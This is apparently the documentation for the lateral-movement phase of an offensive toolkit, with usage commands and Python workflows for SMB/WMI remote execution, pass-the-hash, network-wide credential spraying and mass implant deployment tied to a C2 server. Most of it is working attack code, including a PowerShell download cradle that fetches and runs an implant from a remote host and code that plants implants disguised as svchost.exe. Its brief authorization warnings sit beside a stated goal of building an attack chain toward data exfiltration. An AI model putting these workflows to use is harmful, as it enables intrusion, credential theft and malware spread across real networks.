# Phase 4: Lateral Movement

## Overview

Phase 4 implements lateral movement techniques for moving across networks after initial compromise. This phase includes SMB/WMI-based remote code execution, pass-the-hash authentication, credential spraying, and automated lateral movement scanning across network ranges.

## Architecture

```
Phase 4 Components:
├── Lateral Movement
│   ├── SMB Execution (PSExec-style, File Upload, Share Enumeration)
│   ├── WMI Execution (Remote Commands, PowerShell, Queries)
│   ├── Pass-the-Hash Authentication
│   └── Automated Scanning (Credential Spraying, Mass Deployment)
└── Integration with C2 Framework
```

## Modules

### 1. SMB/WMI Execution (`lateral_movement/smb_wmi.py`)

Comprehensive SMB and WMI-based lateral movement capabilities.

**SMB Techniques:**
- Connection testing and validation
- Share enumeration
- File upload via SMB
- PSExec-style service execution
- Pass-the-hash authentication

**WMI Techniques:**
- Remote command execution
- PowerShell script execution (base64 encoded)
- WMI queries for system information
- Process creation and management

**Usage:**

```bash
# Test SMB connection
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin -p Password123 --test

# Enumerate shares
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin -p Password123 --shares

# Upload file via SMB
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin -p Password123 \
  --upload C:\local\implant.exe C$\temp\implant.exe

# Execute command via SMB (PSExec-style)
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin -p Password123 \
  --exec "whoami"

# Execute command via WMI
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin -p Password123 \
  --wmi "whoami"

# Get system info via WMI
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin -p Password123 --sysinfo

# Pass-the-hash
python lateral_movement/smb_wmi.py 192.168.1.100 -u admin \
  --hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c --test
```

**Python API:**

```python
from lateral_movement.smb_wmi import SMBExecution, WMIExecution

# SMB Execution
smb = SMBExecution(
    target='192.168.1.100',
    username='admin',
    password='Password123',
    domain='CORP'
)

# Test connection
if smb.test_connection():
    print("[+] SMB connection successful")

    # Enumerate shares
    shares = smb.enumerate_shares()
    print(f"[+] Found {len(shares)} shares")

    # Upload implant
    smb.upload_file('C:\\implant.exe', 'C$\\temp\\implant.exe')

    # Execute via PSExec-style service
    smb.psexec_execute('C:\\temp\\implant.exe', service_name='UpdateService')

# Pass-the-Hash
smb_pth = SMBExecution(
    target='192.168.1.100',
    username='admin',
    hash='aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c',
    domain='CORP'
)

if smb_pth.test_connection():
    print("[+] Pass-the-hash successful!")

# WMI Execution
wmi = WMIExecution(
    target='192.168.1.100',
    username='admin',
    password='Password123',
    domain='CORP'
)

# Execute command
output = wmi.execute_command('whoami')
print(output)

# Execute PowerShell
ps_script = '''
Get-Process | Where-Object {$_.CPU -gt 10} | Select-Object Name, CPU
'''
wmi.execute_powershell(ps_script)

# Get system information
info = wmi.get_system_info()
print(f"OS: {info['os']}")
print(f"Computer: {info['computer']}")
```

### 2. Automated Lateral Movement (`lateral_movement/automated_lateral.py`)

Comprehensive automated lateral movement scanner with credential spraying and mass deployment.

**Features:**
- Network target discovery from CIDR ranges
- Credential spraying across multiple targets
- Automated SMB/WMI access testing
- Implant deployment to compromised hosts
- Credential success rate tracking
- Comprehensive reporting

**Usage:**

```bash
# Spray single credential
python lateral_movement/automated_lateral.py --targets 192.168.1.0/24 \
  -u admin -p Password123 -d CORP

# Spray multiple credentials
python lateral_movement/automated_lateral.py --targets 192.168.1.0/24 \
  -u admin -p Password123 \
  -u user -p Password456 \
  -d CORP

# Use credential file (format: username:password:domain)
python lateral_movement/automated_lateral.py --targets 192.168.1.0/24 \
  --cred-file creds.txt

# Deploy implants to compromised hosts
python lateral_movement/automated_lateral.py --targets 192.168.1.0/24 \
  --cred-file creds.txt \
  --deploy \
  --implant C:\implant.exe \
  --remote-path C$\temp\svchost.exe \
  --c2-url http://10.10.10.10:8443

# Export results
python lateral_movement/automated_lateral.py --targets 192.168.1.0/24 \
  --cred-file creds.txt \
  --export lateral_results.json
```

**Python API:**

```python
from lateral_movement.automated_lateral import AutomatedLateralMovement

# Initialize scanner
scanner = AutomatedLateralMovement(max_workers=10, domain='CORP')

# Add credentials
scanner.add_credential('admin', 'Password123', 'CORP')
scanner.add_credential('user', 'Password456', 'CORP')
scanner.add_credential('backup', 'Backup2024!', 'CORP')

# Add targets
scanner.add_target_range('192.168.1.0/24')
scanner.add_target_range('10.10.10.0/24')

# Or add individual targets
scanner.add_target('192.168.1.100', hostname='DC01')
scanner.add_target('192.168.1.101', hostname='FILE01')

# Spray credentials (stop on first success per target)
results = scanner.spray_credentials(stop_on_success=True)

# Print compromised hosts
print(f"[+] Compromised {len(scanner.compromised_hosts)} hosts:")
for host in scanner.compromised_hosts:
    target = scanner.targets[host]
    print(f"  {host} - {target.access_method} - {target.credentials_used}")

# Deploy implants
for host in scanner.compromised_hosts:
    scanner.deploy_implant(
        target=host,
        implant_path='C:\\implant.exe',
        remote_path='C$\\temp\\svchost.exe',
        c2_url='http://10.10.10.10:8443'
    )

# Generate report
print(scanner.generate_report())

# Export to JSON
scanner.export_results('lateral_movement.json')
```

## Complete Workflows

### Workflow 1: Single Target Lateral Movement

```python
from lateral_movement.smb_wmi import SMBExecution, WMIExecution

# Target a known host
target = '192.168.1.100'
username = 'admin'
password = 'Password123'
domain = 'CORP'

# Step 1: Test SMB access
smb = SMBExecution(target, username, password, domain)

if smb.test_connection():
    print(f"[+] SMB access successful to {target}")

    # Step 2: Enumerate shares
    shares = smb.enumerate_shares()

    # Step 3: Upload implant
    if 'C$' in shares:
        smb.upload_file('C:\\local\\implant.exe', 'C$\\temp\\update.exe')

        # Step 4: Execute implant
        smb.psexec_execute('C:\\temp\\update.exe', service_name='WinUpdate')

        print(f"[+] Implant deployed and executed on {target}")

else:
    # Fallback to WMI
    wmi = WMIExecution(target, username, password, domain)

    # Execute PowerShell download cradle
    ps_script = '''
    $url = "http://10.10.10.10:8000/implant.exe"
    $path = "C:\\temp\\update.exe"
    Invoke-WebRequest -Uri $url -OutFile $path
    Start-Process $path
    '''

    wmi.execute_powershell(ps_script)
    print(f"[+] Implant deployed via WMI download cradle")
```

### Workflow 2: Network-Wide Credential Spray

```python
from lateral_movement.automated_lateral import AutomatedLateralMovement

# Initialize scanner
scanner = AutomatedLateralMovement(max_workers=20, domain='CORP')

# Load credentials from file
with open('harvested_creds.txt') as f:
    for line in f:
        username, password = line.strip().split(':')
        scanner.add_credential(username, password, 'CORP')

print(f"[+] Loaded {len(scanner.credentials)} credentials")

# Add entire subnet
scanner.add_target_range('192.168.1.0/24')

print(f"[+] Added {len(scanner.targets)} targets")

# Spray credentials (test all credentials on all hosts)
print("[*] Starting credential spray...")
results = scanner.spray_credentials(stop_on_success=False)

# Analyze results
print(f"\n[+] Spray complete!")
print(f"  Credentials tested: {scanner.scan_stats['credentials_tested']}")
print(f"  Hosts compromised: {scanner.scan_stats['hosts_compromised']}")
print(f"  Success rate: {(scanner.scan_stats['successful_movements'] / scanner.scan_stats['credentials_tested'] * 100):.2f}%")

# Show credential success rates
rates = scanner._calculate_success_rate()
for cred, stats in sorted(rates.items(), key=lambda x: x[1]['rate'], reverse=True):
    print(f"\n{cred}:")
    print(f"  Success rate: {stats['rate']}%")
    print(f"  Successes: {stats['successes']}/{stats['attempts']}")

# Export results
scanner.export_results('spray_results.json')
```

### Workflow 3: Automated Mass Deployment

```python
from lateral_movement.automated_lateral import AutomatedLateralMovement

# Initialize scanner
scanner = AutomatedLateralMovement(domain='CORP')

# Add known good credentials
scanner.add_credential('admin', 'Password123', 'CORP')

# Add target networks
scanner.add_target_range('192.168.1.0/24')
scanner.add_target_range('10.10.10.0/24')

# Run automated scan with implant deployment
results = scanner.run_automated_scan(
    deploy_implants=True,
    implant_config={
        'implant_path': 'C:\\implant.exe',
        'remote_path': 'C$\\windows\\temp\\svchost.exe',
        'c2_url': 'http://10.10.10.10:8443'
    }
)

print(scanner.generate_report())
```

### Workflow 4: Pass-the-Hash Lateral Movement

```python
from lateral_movement.smb_wmi import SMBExecution
from persistence.credential_dumping import CredentialDumper

# Step 1: Dump credentials from compromised host
dumper = CredentialDumper()
creds = dumper.dump_all()

# Extract NTLM hashes
hashes = [c for c in creds if c.credential_type == 'hash']

print(f"[+] Extracted {len(hashes)} NTLM hashes")

# Step 2: Attempt pass-the-hash to other targets
targets = ['192.168.1.100', '192.168.1.101', '192.168.1.102']

for hash_cred in hashes:
    username = hash_cred.username
    ntlm_hash = hash_cred.value

    print(f"\n[*] Attempting pass-the-hash with {username}...")

    for target in targets:
        smb = SMBExecution(
            target=target,
            username=username,
            hash=ntlm_hash,
            domain='CORP'
        )

        if smb.test_connection():
            print(f"[+] Pass-the-hash successful to {target}!")

            # Deploy implant
            smb.upload_file('C:\\implant.exe', 'C$\\temp\\update.exe')
            smb.psexec_execute('C:\\temp\\update.exe')

            print(f"[+] Implant deployed on {target}")
```

### Workflow 5: Integration with C2 Framework

```python
from lateral_movement.automated_lateral import AutomatedLateralMovement
from c2.server.tasking import TaskingManager
from persistence.credential_dumping import CredentialDumper

# Assume we have active C2 implant
implant_id = 'abc123'
tm = TaskingManager()

# Step 1: Dump credentials from current implant
task = tm.create_task(
    implant_id=implant_id,
    task_type='execute',
    command='python credential_dumping.py --export creds.json'
)

# Wait for completion and download results
# ... (task execution logic)

# Step 2: Load credentials
scanner = AutomatedLateralMovement()

with open('creds.json') as f:
    import json
    creds = json.load(f)

    for cred in creds:
        if cred['credential_type'] == 'password':
            scanner.add_credential(
                cred['username'],
                cred['value'],
                cred.get('domain', '.')
            )

# Step 3: Identify target network
# Get network info from implant
task = tm.create_task(
    implant_id=implant_id,
    task_type='execute',
    command='ipconfig /all'
)

# Parse network range
# ... (network discovery logic)

# Step 4: Spray credentials
scanner.add_target_range('192.168.1.0/24')
results = scanner.spray_credentials()

# Step 5: Deploy C2 implants to compromised hosts
c2_url = 'http://10.10.10.10:8443'

for host in scanner.compromised_hosts:
    scanner.deploy_implant(
        target=host,
        implant_path='c2/implant/basic_implant.py',
        remote_path='C$\\temp\\python_script.py',
        c2_url=c2_url
    )

print(f"[+] Deployed C2 implants to {len(scanner.compromised_hosts)} hosts")

# Step 6: Monitor for new implant check-ins
# ... (C2 monitoring logic)
```

## Security Considerations

**CRITICAL WARNINGS:**

1. **Authorization Required**: Only use on networks you own or have explicit written permission to test
2. **Credential Spraying**: Extremely noisy and will trigger account lockouts if not careful
3. **Mass Deployment**: Can cause network disruption and will be detected by security tools
4. **Pass-the-Hash**: Requires administrative access and may trigger security alerts
5. **Legal Implications**: Unauthorized lateral movement is illegal in most jurisdictions

**Best Practices:**

- Always obtain written authorization before testing
- Use in isolated lab environments for learning
- Implement rate limiting for credential spraying (avoid account lockouts)
- Monitor for detection during engagements
- Document all lateral movement for legitimate penetration tests
- Clean up all deployed implants after testing
- Respect scope limitations and network boundaries

**Anti-Lockout Measures:**

```python
# Add delay between attempts
import time

scanner = AutomatedLateralMovement()
scanner.add_credential('admin', 'Password123')
scanner.add_target_range('192.168.1.0/24')

# Custom spray with delays
for target in scanner.targets:
    for username, password, domain in scanner.credentials:
        scanner.attempt_lateral_movement(target, username, password, domain)

        # Wait 30 seconds between attempts to avoid lockout
        time.sleep(30)
```

## Troubleshooting

### Windows Issues

**SMB Access Denied:**
- Verify credentials are correct
- Check if SMB is enabled on target
- Verify firewall rules allow SMB (port 445)
- Check if target requires SMBv2/SMBv3

**WMI Connection Failed:**
- Requires administrative privileges
- Verify DCOM/WMI is enabled
- Check firewall rules (port 135, 445)
- May need to enable WMI through firewall

**PSExec Execution Fails:**
- Requires admin$ share access
- Service creation requires administrative rights
- Check if service already exists with same name
- Verify target can create services

### Pass-the-Hash Issues

**Hash Format:**
- NTLM hash format: `LM:NT` (e.g., `aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c`)
- LM hash is often empty (represented as `aad3b435b51404eeaad3b435b51404ee`)
- Only NT hash is required

**Authentication Failure:**
- Verify hash is correct
- Some systems require NTLMv2 which doesn't work with pass-the-hash
- Account may be protected (e.g., Protected Users group)

### Network Issues

**No Targets Found:**
- Verify CIDR range is correct
- Check network connectivity
- Hosts may be offline or blocking ICMP

**Credential Spray Slow:**
- Reduce `max_workers` if network is saturated
- Add delays between attempts
- Target smaller ranges at a time

## Testing

Run Phase 4 tests:

```bash
# Run lateral movement tests
pytest tests/test_lateral_movement.py -v

# Run with coverage
pytest tests/test_lateral_movement.py -v --cov=lateral_movement
```

**Expected Results:**
- 35 tests total
- 100% pass rate
- 55%+ code coverage (for lateral movement modules)

## MITRE ATT&CK Mapping

Phase 4 implements the following MITRE ATT&CK techniques:

- **T1021.001** - Remote Services: Remote Desktop Protocol (preparation)
- **T1021.002** - Remote Services: SMB/Windows Admin Shares
- **T1021.003** - Remote Services: Distributed Component Object Model
- **T1021.006** - Remote Services: Windows Remote Management
- **T1047** - Windows Management Instrumentation
- **T1550.002** - Use Alternate Authentication Material: Pass the Hash
- **T1570** - Lateral Tool Transfer
- **T1021** - Remote Services

## Integration with Other Phases

**Phase 3 Integration (Persistence):**
```python
from lateral_movement.automated_lateral import AutomatedLateralMovement
from persistence.credential_dumping import CredentialDumper

# Dump credentials from compromised host
dumper = CredentialDumper()
creds = dumper.dump_all()

# Use for lateral movement
scanner = AutomatedLateralMovement()
for cred in creds:
    if cred.credential_type == 'password':
        scanner.add_credential(cred.username, cred.value, cred.domain or '.')
```

**Phase 1 Integration (C2):**
```python
from lateral_movement.smb_wmi import SMBExecution

# Deploy C2 implant via lateral movement
smb = SMBExecution('192.168.1.100', 'admin', 'Password123')
smb.upload_file('c2/implant/basic_implant.py', 'C$\\temp\\implant.py')
smb.psexec_execute('python C:\\temp\\implant.py')
```

## Next Steps

After Phase 4:
1. Verify lateral movement capabilities
2. Test credential spraying with rate limiting
3. Document compromised hosts
4. Proceed to Phase 5: Data Exfiltration
5. Continue building comprehensive attack chain

## Additional Resources

- [PSExec Documentation](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)
- [WMI Offensive Techniques](https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html)
- [Pass-the-Hash Explained](https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [Impacket Toolkit](https://github.com/SecureAuthCorp/impacket) - Advanced SMB/WMI tools
